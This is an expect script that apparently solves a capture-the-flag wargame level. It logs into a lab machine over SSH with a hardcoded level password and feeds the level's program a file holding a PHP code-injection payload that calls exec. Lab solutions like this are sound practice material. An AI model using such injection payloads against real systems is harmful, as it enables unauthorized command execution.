#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level06@$ip -p 4242 "mkdir -p /tmp/level06 ; cd /tmp/level06 ; chmod 777 . ; echo '\[x \{\$\{exec\(getflag\)\}\}\]' > flag ; ~/level06 /tmp/level06/flag"
expect "sword:"
send "viuaaale9huek52boumoomioc\r"
interact
